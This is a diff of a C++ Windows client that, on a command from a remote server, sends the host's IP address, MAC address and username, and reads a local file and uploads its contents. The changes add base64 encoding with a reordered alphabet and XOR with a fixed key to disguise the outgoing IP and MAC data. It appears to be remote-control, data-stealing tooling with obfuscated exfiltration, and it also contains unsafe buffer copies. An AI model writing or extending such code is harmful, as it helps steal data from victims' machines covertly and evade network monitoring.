@@ -30,6 +30,120 @@
 #pragma comment(lib, "iphlpapi.lib")
 #pragma warning(disable : 4996)
 
+#include <iostream>
+#include <bitset>
+
+static const std::string base64_chars =
+"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+"abcdefghijklmnopqrstuvwxyz"
+"1234567890+/";
+
+std::string base64_encode(unsigned char const*, unsigned int len);
+std::string base64_decode(std::string const& s);
+std::string XOR(std::string value, std::string key);
+
+static inline bool is_base64(unsigned char c) {
+    return (isalnum(c) || (c == '+') || (c == '/'));
+}
+
+std::string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len) {
+    std::string ret;
+    int i = 0;
+    int j = 0;
+    unsigned char char_array_3[3];
+    unsigned char char_array_4[4];
+
+    while (in_len--) {
+        char_array_3[i++] = *(bytes_to_encode++);
+        if (i == 3) {
+            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
+            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
+            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
+            char_array_4[3] = char_array_3[2] & 0x3f;
+
+            for (i = 0; (i < 4); i++)
+                ret += base64_chars[char_array_4[i]];
+            i = 0;
+        }
+    }
+
+    if (i)
+    {
+        for (j = i; j < 3; j++)
+            char_array_3[j] = '\0';
+
+        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
+        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
+        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
+        char_array_4[3] = char_array_3[2] & 0x3f;
+
+        for (j = 0; (j < i + 1); j++)
+            ret += base64_chars[char_array_4[j]];
+
+        while ((i++ < 3))
+            ret += '=';
+
+    }
+
+    return ret;
+
+}
+
+std::string base64_decode(std::string const& encoded_string) {
+    int in_len = encoded_string.size();
+    int i = 0;
+    int j = 0;
+    int in_ = 0;
+    unsigned char char_array_4[4], char_array_3[3];
+    std::string ret;
+
+    while (in_len-- && (encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
+        char_array_4[i++] = encoded_string[in_]; in_++;
+        if (i == 4) {
+            for (i = 0; i < 4; i++)
+                char_array_4[i] = base64_chars.find(char_array_4[i]);
+
+            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
+            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
+            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
+
+            for (i = 0; (i < 3); i++)
+                ret += char_array_3[i];
+            i = 0;
+        }
+    }
+
+    if (i) {
+        for (j = i; j < 4; j++)
+            char_array_4[j] = 0;
+
+        for (j = 0; j < 4; j++)
+            char_array_4[j] = base64_chars.find(char_array_4[j]);
+
+        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
+        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
+        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
+
+        for (j = 0; (j < i - 1); j++) ret += char_array_3[j];
+    }
+
+    return ret;
+}
+
+std::string XOR(std::string value, std::string key)
+{
+    std::string retval(value);
+    long unsigned int klen = key.length();
+    long unsigned int vlen = value.length();
+    unsigned long int k = 0;
+    unsigned long int v = 0;
+    for (; v < vlen; v++) {
+        retval[v] = value[v] ^ key[k];
+        k = (++k < klen ? k : 0);
+    }
+    return retval;
+}
+
 struct tuple1
 {
     char *ipAddress;
@@ -152,6 +266,39 @@ std::string getOsName()
 #endif
 }
 
+string convertToString(char* a, int size)
+{
+    int i;
+    string s = "";
+    for (i = 0; i < size; i++) {
+        s = s + a[i];
+    }
+    return s;
+}
+
+std::string decryption(char cipher[512])
+{
+    string decrypted;
+    string q = ":&";
+    string decryptedString;
+    decrypted = XOR(cipher, q);
+    char decrypt[1024];
+    //decryptedString = decrypted; //.substr(0, decrypted.find("=")) + "=";
+    strcpy(decrypt, decrypted.c_str());
+    decrypted = base64_decode(decrypt);
+    return decrypted;
+}
+
+std::string encryption(char cipher[512])
+{
+    string encrypted = base64_encode((unsigned char*)cipher, strlen(cipher));
+    string q = ":&";
+    encrypted = XOR(encrypted, q);
+    char encrypt[UNLEN + 1];
+    strcpy(encrypt, encrypted.c_str());
+    return encrypt;
+}
+
 int __cdecl main(int argc, char **argv)
 {
     WSADATA wsaData;
@@ -246,6 +393,8 @@ int __cdecl main(int argc, char **argv)
         iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
         string rc = string(recvbuf);
         string OS = getOsName();
+        string encryptedString;
+        char encrypted_star[512];
         if (rc.find("1") != std::string::npos)
         {
             
@@ -256,13 +405,18 @@ int __cdecl main(int argc, char **argv)
 
             printf("Windows version: %u.%u\n", info.dwMajorVersion, info.dwMinorVersion);
             information.ipAddress += '\000';
+            information.macAddress += '\000';
             cout << "Sending the information" << endl;
             cout << information.ipAddress << "..." << endl;
-            iResult = send(ConnectSocket, information.ipAddress, strlen(information.ipAddress), 0);
+            encryptedString = encryption(information.ipAddress);
+            strcpy(encrypted_star, encryptedString.c_str());
+            iResult = send(ConnectSocket, encrypted_star, strlen(encrypted_star), 0);
             iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
 
+            encryptedString = encryption(information.macAddress);
+            strcpy(encrypted_star, encryptedString.c_str());
             cout << information.macAddress << "..." << endl;
-            iResult = send(ConnectSocket, information.macAddress, strlen(information.macAddress), 0);
+            iResult = send(ConnectSocket, encrypted_star, strlen(encrypted_star), 0);
 
             cout << username << "..." << endl;
             iResult = send(ConnectSocket, username, username_len, 0);
@@ -286,9 +440,9 @@ int __cdecl main(int argc, char **argv)
                 char *content = (char *)malloc(fsize + 1);
                 fread(content, fsize, 1, f);
                 fclose(f);
-                iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
+                iResult = recv(ConnectSocket, recvbuf, strlen(recvbuf), 0);
                 iResult = send(ConnectSocket, to_string(fsize).c_str(), strlen(to_string(fsize).c_str()), 0);
-                iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
+                iResult = recv(ConnectSocket, recvbuf, strlen(recvbuf), 0);
                 iResult = send(ConnectSocket, content, fsize, 0);
                 cout << "File sent" << endl;
                 memset(recvbuf, 0, sizeof recvbuf);
